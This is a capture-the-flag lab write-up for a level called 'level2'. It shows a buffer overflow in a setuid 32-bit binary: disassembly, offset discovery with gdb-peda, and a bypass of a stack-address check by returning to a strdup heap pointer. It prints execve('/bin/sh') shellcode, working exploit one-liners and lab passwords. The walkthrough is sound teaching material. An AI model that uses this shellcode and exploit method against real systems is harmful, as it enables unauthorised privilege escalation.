# Level2 - Buffer overflow with protection against return address in stack memory

## Local script usage

```shell
Usage: ./main.sh
```

## Passwords and token

|        |                                                                    |
| ------ | ------------------------------------------------------------------ |
| level2 | `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77` |
| level3 | `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02` |

## Steps to resolve on VM

Note: From now, we will use `gdb-peda`. You can setup peda with the script: [scripts/installPeda.sh](../../scripts/installPeda.sh)

1. Connect to `level2` user

```shell
ssh level2@$SNOW_HOST -p 4242
# Enter the password

ls -l
> -rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
```

Notice there is a binary with level2 setuid.

2. Debug level2

Execute level2

```shell
./level2
(stdin) abcdef
> abcdef
```

Lets debug the binary

```shell
(gdb) info functions

> (...)
  0x080484d4  p
  0x0804853f  main
  (...)
```

```shell
gdb-peda$ pdisas main
  0x0804853f <+0>:     push   %ebp
  0x08048540 <+1>:     mov    %esp,%ebp
  0x08048542 <+3>:     and    $0xfffffff0,%esp
  0x08048545 <+6>:     call   0x80484d4 <p>             # call p()
  0x0804854a <+11>:    leave
  0x0804854b <+12>:    ret

gdb-peda$ pdisas p
Dump of assembler code for function p:
  0x080484d4 <+0>:     push   %ebp
  0x080484d5 <+1>:     mov    %esp,%ebp
  0x080484d7 <+3>:     sub    $0x68,%esp
  0x080484da <+6>:     mov    0x8049860,%eax            # 0x8049860 <stdout@@GLIBC_2.0>:   ""
  0x080484df <+11>:    mov    %eax,(%esp)
  0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>    # call fflush(stdout)
  0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax          # buffer start at -0x4c(%ebp) => -76
  0x080484ea <+22>:    mov    %eax,(%esp)
  0x080484ed <+25>:    call   0x80483c0 <gets@plt>      # call gets(buff)
  0x080484f2 <+30>:    mov    0x4(%ebp),%eax            # buf + 80 => $eax     (get return address)
  0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)           # $eax     => buf + 64 (???)
  0x080484f8 <+36>:    mov    -0xc(%ebp),%eax           # buf + 64 => $eax     (???)
  0x080484fb <+39>:    and    $0xb0000000,%eax          # $eax = $0xb0000000 & $eax
  0x08048500 <+44>:    cmp    $0xb0000000,%eax          # compare $0xb0000000 and $eax
  0x08048505 <+49>:    jne    0x8048527 <p+83>          # if != jump to *p+83
  0x08048507 <+51>:    mov    $0x8048620,%eax           # 0x8048620: "(%p)\n"
  0x0804850c <+56>:    mov    -0xc(%ebp),%edx
  0x0804850f <+59>:    mov    %edx,0x4(%esp)
  0x08048513 <+63>:    mov    %eax,(%esp)
  0x08048516 <+66>:    call   0x80483a0 <printf@plt>    # call printf("(%p)\n", ptr)
  0x0804851b <+71>:    movl   $0x1,(%esp)
  0x08048522 <+78>:    call   0x80483d0 <_exit@plt>     # call _exit(1)
  0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
  0x0804852a <+86>:    mov    %eax,(%esp)
  0x0804852d <+89>:    call   0x80483f0 <puts@plt>      # call puts(buf)
  0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
  0x08048535 <+97>:    mov    %eax,(%esp)
  0x08048538 <+100>:   call   0x80483e0 <strdup@plt>    # call strdup(buf)
  0x0804853d <+105>:   leave
  0x0804853e <+106>:   ret
```

We can see again the `gets` function which is a vulnerability for buffer overflow.

As there is no `exec` or `system` syscall, we have to create an exploit.
An exploit is often composed of:

> `NopSled (\x90)` + `Shellcode` + `Fake Return Address` > ![shellcode-injection](https://www.0x0ff.info/wp-content/uploads/2015/12/shellcode-injection.gif)

The goal of a hacker is to overwrite a portion of memory called Return Address with a Fake Return Address aimed at the NopSled in order to execute the ShellCode.

3. Get a shellcode
   We need a shellcode that creates a shell for a Linux x86 system.
   We found [this one](http://shell-storm.org/shellcode/files/shellcode-811.php):

```shell
# Title:	Linux x86 execve("/bin/sh") - 28 bytes

08048060 <_start>:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80

# \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

4. Find the offset

Lets find the offset, while inserting a bigger input than the buffer can receive.
We would overwrite the return address. By comparing EIP content and the input, it gives us the offset index.

Peda has some useful tools to get the offset easily:

```shell
(gdb-peda) pattern create 200 input
> Writing pattern of 200 chars to filename "input"

(gdb-peda) run < input
> Stopped reason: SIGSEGV
  0x41414a41 in ?? ()
  EIP: 0x41414a41 ('AJAA')

(gdb-peda) pattern offset AJAA
> AJAA found at offset: 80

# or
(gdb-peda) pattern offset $pc
> 1094797889 found at offset: 80

# or
(gdb-peda) pattern search
> Registers contain pattern buffer:
    EIP+0 found at offset: 80       <----- Return address overwrited
    (...)


```

5. Find the correct return address
   The idea is to find the return address to execute the shellcode.

```bash
# Initial Buffer
BUFFER (64) | SAVE FRAME POINTER (16) | RETURN ADDRESS (4)
0 --------- 64 ---------------------- 80 -------------- 84

# Exploit
NopSled (80-28) | SHELLCODE (28) | RETURN ADDRESS (4)
0 ------------- 52 ------------- 80 -------------- 84
        ┌────>──  exec(/bin/sh)         │
        └─<─────<─────<─────<─────<─────┘
```

NopSled is an instruction that does nothing and goes to the next memory bit.
We can point to the middle of the buffer and it should sled until the shellcode.

Lets find the middle of the buffer.

```bash
gdb-peda$ pdisass p
# Breakpoint before leave instuction
gdb-peda$ b *0x0804853d (p leave)
# Run with an input of 80 chars + return address of ret address of p function
gdb-peda$ run <<< $(python -c 'print "a" * 80 + "\x3e\x85\x04\x08"')

gdb-peda$ x/100xg $esp
0xbffff5e0: 0x00000000bffff5fc 0xb7e5ec7300000000
0xbffff5f0: 0x00000000080482b5 0x6161616100c30000
0xbffff600: 0x6161616161616161 0x6161616161616161
0xbffff610: 0x6161616161616161 0x6161616161616161 <<< --- take this address
0xbffff620: 0x6161616161616161 0x6161616161616161
0xbffff630: 0x6161616161616161 0x0804853e61616161
0xbffff640: 0x6161616161616161 0x0804853e61616161
0xbffff650: 0x0000000008048500 0xb7e454d300000000
0xbffff660: 0xbffff6f400000001 0xb7fdc858bffff6fc
0xbffff670: 0xbffff61c00000000 0x00000000bffff6fc
0xbffff680: 0xb7fd0ff408048260 0x0000000000000000
0xbffff690: 0xebd85d4f00000000 0x00000000dc9db95f
```

`0xbffff610` is the middle of the buffer, we will take this one as fake return address.

In little endian, it gives us => `0x10f6ffbf`

Lets try

```bash
# python -c 'print(nopSled + shellcode + retAddress)' > /tmp/exploit
python -c 'print(
  "\x90" * 52 +
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" +
  "\x10\xf6\xff\xbf"
)' > /tmp/exploit

~/level2 < /tmp/exploit
> (0xbffff610)

> echo $?
> 1
```

The program exits "normally" with an error value.

It means something happened but the exploit has not been executed. Why ?

```shell
  (...)
  0x080484fb <+39>:    and    $0xb0000000,%eax          # $eax = $0xb0000000 & $eax
  0x08048500 <+44>:    cmp    $0xb0000000,%eax          # compare $0xb0000000 and $eax
  0x08048505 <+49>:    jne    0x8048527 <p+83>          # if != jump to *p+83
  0x08048507 <+51>:    mov    $0x8048620,%eax           # 0x8048620: "(%p)\n"
  0x0804850c <+56>:    mov    -0xc(%ebp),%edx
  0x0804850f <+59>:    mov    %edx,0x4(%esp)
  0x08048513 <+63>:    mov    %eax,(%esp)
  0x08048516 <+66>:    call   0x80483a0 <printf@plt>    # call printf("(%p)\n", ptr)
  0x0804851b <+71>:    movl   $0x1,(%esp)
  0x08048522 <+78>:    call   0x80483d0 <_exit@plt>     # call _exit(1)
  (...)
```

As the return address starts with "0xb", which is an address in the stack, the program exits. The program checks the return address is not an address in the stack memory.

We have to find another fake return address.

While looking [this schema](https://www.0x0ff.info/wp-content/uploads/2015/12/buffer-overflow-memory-segmentation-cheat-sheet.png), we learn that heap memory contains variables allocated with `malloc()`.
The syscall `strdup` calls `malloc`. As ASLR is disabled, addresses are not randomized.

```bash
gdb-peda$ pdisas p
#   0x08048538 <+100>:    call   0x80483e0 <strdup@plt>
# => 0x0804853d <+105>:   leave
# put a breakpoint just after strdup
gdb-peda$ b *0x0804853d

# print $eax content, which contains the pointer return by strdup
gdb-peda$ p $eax
> $1 = 0x804a008
```

As this address does not stars with `0xb`, we can use it to pass the protection.

6. Get the shell

Lets try

```bash
# python -c 'print(nopSled + shellcode + retAddress)' > /tmp/exploit
(python -c 'print(
  "\x90" * 52 +
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" +
  "\x08\xa0\x04\x08"
)' ; cat) | ~/level2

(stdin) id
> Segmentation fault (core dumped)
```

It does not work...

As we know the exact address of the pointer, maybe we can directly aim the shellcode and skip Nopsled. Then add a padding after the shellcode.

```bash
(python -c 'print(
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" +
  "A" * 52 +
  "\x08\xa0\x04\x08"
)' ; cat) | ~/level2

(stdin) id
> uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)

(stdin) cat /home/user/level3/.pass
> 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

It works !
But at this moment, I don't really understood why it does not work with Nopsled. I hope understand that with next levels.

---

## Sources

### Buffer overflow

- [Memory segmentation - Cheat sheet](https://www.0x0ff.info/wp-content/uploads/2015/12/buffer-overflow-memory-segmentation-cheat-sheet.png)

- [FR - Buffer Overflow & gdb – Part 1](https://www.0x0ff.info/2015/buffer-overflow-gdb-part1/)
- [FR - Buffer Overflow & gdb – Part 2](https://www.0x0ff.info/2015/buffer-overflow-gdb-part-2/)
- [FR - Buffer Overflow & gdb – Part 3](https://www.0x0ff.info/2015/buffer-overflow-gdb-part-3/)
- [FR - Overflow, comment éxecuter votre Shellcode](https://www.kali-linux.fr/hacking/overflow-comment-executer-votre-shellcode)

### Shellcode

- [Shellcode - Linux x86 execve("/bin/sh") - 28 bytes](http://shell-storm.org/shellcode/files/shellcode-811.php)

### C

- [Getting the Return or Frame Address of a Function](https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html)

### Shell

- [Man fflush](https://linux.die.net/man/3/fflush)
- [Man gets](https://linux.die.net/man/3/gets)
- [Man printf](https://linux.die.net/man/3/printf)
- [Man exit](https://linux.die.net/man/3/exit)
- [Man puts](https://linux.die.net/man/3/puts)
- [Man strdup](https://linux.die.net/man/3/strdup)

```

```
